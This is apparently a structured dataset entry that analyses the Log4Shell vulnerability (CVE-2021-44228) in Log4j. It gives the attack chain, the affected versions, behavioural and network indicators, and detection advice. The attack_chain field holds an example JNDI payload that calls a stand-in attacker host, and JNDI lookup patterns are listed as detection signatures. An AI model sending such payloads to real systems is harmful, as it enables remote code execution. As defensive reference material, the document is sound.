package_info.package_versions: 2.0-beta9 through 2.15.0 (Log4Shell affected versions; 2.16.0 and 2.17.0 also have related vulnerabilities, but Log4Shell is mitigated in 2.16.0+)
package_info.why_malicious: The affected versions of the Log4j library contain the Log4Shell vulnerability (CVE-2021-44228), which allows remote code execution when a specially crafted log message containing a JNDI lookup is processed. Although not intentionally malicious, this critical vulnerability enables attackers to execute arbitrary code on affected systems, making the package effectively malicious in practice.

execution_context.trigger: At runtime, when a log message containing a JNDI lookup pattern is processed by the logger
required_permissions: Network access (to perform outbound JNDI lookups)
JNDI access (Java Naming and Directory Interface)
Ability to load and execute remote Java classes

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, the Log4j library interprets the pattern, initiates a remote JNDI lookup to an attacker-controlled LDAP server, retrieves a reference to a remote Java class, and loads and executes the class, resulting in remote code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger outbound network requests and load remote code, which can result in arbitrary code execution by attackers.
malice_analysis.violated_expectations: Standard logging libraries are expected to record messages without executing code or making network requests based on log content. Here, simply logging a string can result in the application making network connections and executing attacker-supplied code.
malice_analysis.similar_legitimate_use: JNDI lookups may be used for dynamic configuration in trusted, internal environments where log content is strictly controlled, but exposing this functionality to untrusted user input is never legitimate.
key_indicators: Presence of JNDI lookup patterns (e.g., ${jndi:ldap://...}) in log messages
Log4j processing of user-controlled log content containing JNDI expressions
Outbound LDAP or RMI network requests initiated by the logging process
Dynamic loading and execution of remote Java classes via JNDI

attack_chain.action: Attacker sends a crafted log message containing a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: Log4j processes the log message and interprets the JNDI lookup pattern.

attack_chain.action: Log4j initiates a JNDI lookup to the attacker-controlled LDAP server specified in the log message.
attack_chain.leads_to: The LDAP server responds with a reference to a malicious Java class.

attack_chain.action: The vulnerable application loads and executes the malicious Java class returned by the LDAP server.
attack_chain.leads_to: Attacker gains remote code execution and control over the application/server.

behavioral_signatures: Log messages containing JNDI lookup patterns such as ${jndi:ldap://}, ${jndi:rmi://}, or ${jndi:dns://}
Unexpected outbound LDAP, RMI, or DNS network requests from application servers following log events
Dynamic loading and execution of remote Java classes via JNDI lookups
file_indicators: Presence of log4j-core-2.x.jar (versions 2.0-beta9 through 2.15.0) in application dependencies
Use or import of org.apache.logging.log4j.core.lookup.JndiLookup in application code or dependencies
network_indicators: Outbound LDAP, RMI, or DNS requests to external IP addresses or domains not associated with the organization
Connections to attacker-controlled infrastructure immediately after log events containing suspicious patterns
detection_knowledge.how_to_detect: Monitor application logs for JNDI lookup patterns (e.g., ${jndi:ldap://}, ${jndi:rmi://}), audit dependencies for vulnerable Log4j versions (2.0-beta9 through 2.15.0), and monitor for unexpected outbound JNDI-related network traffic. Use static analysis to detect use of JndiLookup in log4j-core, and configure network monitoring or firewall rules to alert or block outbound LDAP/RMI/DNS requests to untrusted endpoints.
